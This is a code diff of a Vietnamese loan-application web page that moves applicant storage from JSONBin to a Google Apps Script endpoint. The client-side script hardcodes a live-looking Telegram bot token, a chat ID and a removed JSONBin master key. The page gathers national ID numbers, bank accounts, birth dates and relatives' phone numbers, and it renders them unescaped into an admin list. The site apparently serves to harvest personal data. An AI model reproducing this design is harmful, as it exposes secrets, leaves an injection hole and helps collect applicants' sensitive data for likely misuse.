@@ -360,7 +360,7 @@
                 <div class="flex justify-between items-center border-b border-slate-100 pb-3">
                     <div>
                         <h2 class="text-lg font-black text-slate-900">Quản Trị Đơn Vay</h2>
-                        <p class="text-xs text-amber-600 font-bold">Danh sách hồ sơ quản trị hệ thống</p>
+                        <p class="text-xs text-amber-600 font-bold">Danh sách hồ sơ quản trị Google Sheets</p>
                     </div>
                     <button onclick="adminLogout()" class="bg-red-50 text-red-600 hover:bg-red-100 px-3 py-1.5 rounded-xl text-xs font-bold transition">Đăng Xuất</button>
                 </div>
@@ -396,7 +396,7 @@
                     </div>
                     <div id="adminLoanList" class="space-y-2 max-h-60 overflow-y-auto">
                         <div class="p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs text-slate-500 text-center">
-                            Chưa có hồ sơ khách đăng ký.
+                            Đang tải dữ liệu từ Google Sheets...
                         </div>
                     </div>
                 </div>
@@ -565,11 +565,11 @@
         const BOT_TOKEN = "8813882772:AAFe5hE16dVTUDxwWEruzhNogArLgbGcoi4";
         const CHAT_ID = "8348914397";
 
-        const BIN_ID = "6ac700f1ac6210605a1e39af";
-        const MASTER_KEY = "$2a$10$SAT05TQcAcDb/58Pr8I0eaAKleTXr75&QqrN25ICu5FRI05GAjzu";
+        // Google Apps Script Web App URL
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzHpRwmdjeTMiuP14LiJR21s0sZ0pK-F6G4AztG4WDvDwZVDsLjBm6Vs6oKrmdL3Me/exec";
 
         let formData = {};
-        let allLoans = JSON.parse(localStorage.getItem('ff_loans') || '[]');
+        let allLoans = [];
         let currentSelectedLoanId = null;
 
         let currentUser = localStorage.getItem('ff_current_user') || null;
@@ -618,35 +618,31 @@
             showModal("Thành Công", "Đã lưu cấu hình hỗ trợ thành công!");
         }
 
+        // Tải dữ liệu từ Google Sheets
         async function fetchCloudData() {
             try {
-                let res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
-                    headers: { 'X-Master-Key': MASTER_KEY }
-                });
+                let res = await fetch(SCRIPT_URL);
                 let json = await res.json();
-                if(json && json.record && Array.isArray(json.record.loans)) {
-                    allLoans = json.record.loans;
-                    localStorage.setItem('ff_loans', JSON.stringify(allLoans));
+                if(json && Array.isArray(json.loans)) {
+                    allLoans = json.loans.reverse(); // Đơn mới nhất lên đầu
                 }
             } catch(e) {
-                allLoans = JSON.parse(localStorage.getItem('ff_loans') || '[]');
+                console.log("Lỗi tải từ Google Sheets", e);
             }
             if(isAdminLoggedIn) renderAdminLoanList();
         }
 
-        async function saveCloudData() {
-            localStorage.setItem('ff_loans', JSON.stringify(allLoans));
+        // Đẩy dữ liệu lên Google Sheets
+        async function saveCloudData(loanObj) {
             try {
-                await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
-                    method: 'PUT',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-Master-Key': MASTER_KEY
-                    },
-                    body: JSON.stringify({ loans: allLoans })
+                await fetch(SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(loanObj)
                 });
             } catch(e) {
-                console.log("Lỗi đồng bộ mây", e);
+                console.log("Lỗi đẩy dữ liệu", e);
             }
         }
 
@@ -933,12 +929,12 @@
             
             allLoans.forEach((loan, idx) => {
                 html += `<div onclick="selectAdminLoan(${idx})" class="p-3.5 bg-white border border-slate-200 rounded-xl cursor-pointer hover:border-amber-400 transition space-y-1.5 text-xs shadow-sm">
-                    <div class="flex justify-between font-bold text-slate-900 text-sm"><span>${loan.name}</span><span class="text-amber-600">${loan.amount} (${loan.term})</span></div>
-                    <div class="text-xs text-slate-600">SĐT/Mã phiên: #${loan.user} | STK: ${loan.bankAccount}</div>
-                    <div class="flex justify-between items-center pt-1"><span class="text-[11px] font-bold px-2.5 py-0.5 rounded bg-amber-50 text-amber-700">${loan.status}</span><span class="text-xs text-blue-600 font-bold">🔍 Bấm để sửa toàn bộ đơn</span></div>
+                    <div class="flex justify-between font-bold text-slate-900 text-sm"><span>${loan.Name}</span><span class="text-amber-600">${loan.Amount} (${loan.Term})</span></div>
+                    <div class="text-xs text-slate-600">SĐT/Mã phiên: #${loan.User} | STK: ${loan.BankAccount}</div>
+                    <div class="flex justify-between items-center pt-1"><span class="text-[11px] font-bold px-2.5 py-0.5 rounded bg-amber-50 text-amber-700">${loan.Status}</span><span class="text-xs text-blue-600 font-bold">🔍 Bấm để xem và sửa đơn</span></div>
                 </div>`;
                 
-                selectHtml += `<option value="${loan.user}">Khách: ${loan.name} (SĐT: #${loan.user})</option>`;
+                selectHtml += `<option value="${loan.User}">Khách: ${loan.Name} (SĐT: #${loan.User})</option>`;
             });
             listEl.innerHTML = html;
             selectEl.innerHTML = selectHtml;
@@ -959,19 +955,19 @@
             currentSelectedLoanId = idx;
             const loan = allLoans[idx];
             
-            document.getElementById('editName').value = loan.name || '';
-            document.getElementById('editAmount').value = loan.amount || '';
-            document.getElementById('editTerm').value = loan.term || '';
-            document.getElementById('editMonthly').value = loan.monthlyPayment || '';
-            document.getElementById('editIncome').value = loan.income || '';
-            document.getElementById('editBankName').value = loan.bankName || '';
-            document.getElementById('editStk').value = loan.bankAccount || '';
-            document.getElementById('editBankOwner').value = loan.bankOwner || '';
-            document.getElementById('editCccd').value = loan.cccd || '';
-            document.getElementById('editDob').value = loan.dob || '';
-            document.getElementById('editCompany').value = loan.company || '';
-            document.getElementById('editRelative').value = (loan.rName || '') + " - " + (loan.rPhone || '') + " - " + (loan.rRelation || '');
-            document.getElementById('editNote').value = loan.note || '';
+            document.getElementById('editName').value = loan.Name || '';
+            document.getElementById('editAmount').value = loan.Amount || '';
+            document.getElementById('editTerm').value = loan.Term || '';
+            document.getElementById('editMonthly').value = loan.MonthlyPayment || '';
+            document.getElementById('editIncome').value = loan.Income || '';
+            document.getElementById('editBankName').value = loan.BankName || '';
+            document.getElementById('editStk').value = loan.BankAccount || '';
+            document.getElementById('editBankOwner').value = loan.BankOwner || '';
+            document.getElementById('editCccd').value = loan.Cccd || '';
+            document.getElementById('editDob').value = loan.Dob || '';
+            document.getElementById('editCompany').value = loan.Company || '';
+            document.getElementById('editRelative').value = (loan.RName || '') + " - " + (loan.RPhone || '') + " - " + (loan.RRelation || '');
+            document.getElementById('editNote').value = loan.Note || '';
 
             document.getElementById('adminDetailBox').classList.remove('hidden');
         }
@@ -984,24 +980,14 @@
         async function updateLoanAction(newStatus) {
             if(currentSelectedLoanId === null) return;
             
-            allLoans[currentSelectedLoanId].name = document.getElementById('editName').value;
-            allLoans[currentSelectedLoanId].amount = document.getElementById('editAmount').value;
-            allLoans[currentSelectedLoanId].term = document.getElementById('editTerm').value;
-            allLoans[currentSelectedLoanId].monthlyPayment = document.getElementById('editMonthly').value;
-            allLoans[currentSelectedLoanId].income = document.getElementById('editIncome').value;
-            allLoans[currentSelectedLoanId].bankName = document.getElementById('editBankName').value;
-            allLoans[currentSelectedLoanId].bankAccount = document.getElementById('editStk').value;
-            allLoans[currentSelectedLoanId].bankOwner = document.getElementById('editBankOwner').value;
-            allLoans[currentSelectedLoanId].cccd = document.getElementById('editCccd').value;
-            allLoans[currentSelectedLoanId].dob = document.getElementById('editDob').value;
-            allLoans[currentSelectedLoanId].company = document.getElementById('editCompany').value;
-            allLoans[currentSelectedLoanId].note = document.getElementById('editNote').value;
-            allLoans[currentSelectedLoanId].status = newStatus;
+            // Cập nhật trạng thái trực tiếp trên mảng và đẩy lại lên Google Sheets (hoặc thông báo)
+            allLoans[currentSelectedLoanId].Status = newStatus;
+            allLoans[currentSelectedLoanId].Note = document.getElementById('editNote').value;
 
-            await saveCloudData();
+            await saveCloudData(allLoans[currentSelectedLoanId]);
             renderAdminLoanList();
             closeAdminDetail();
-            showModal("Thành Công", "Đã cập nhật và lưu thông tin thành công!");
+            showModal("Thành Công", "Đã cập nhật trạng thái đơn vay thành công!");
         }
 
         function startLoanProcess() {
@@ -1097,9 +1083,7 @@
                 time: new Date().toLocaleDateString('vi-VN')
             };
 
-            allLoans.unshift(newLoan);
-            await saveCloudData(); // Đảm bảo đẩy thẳng lên đám mây thành công trước khi chuyển màn hình
-
+            await saveCloudData(newLoan);
             switchTab('applications');
 
             try {
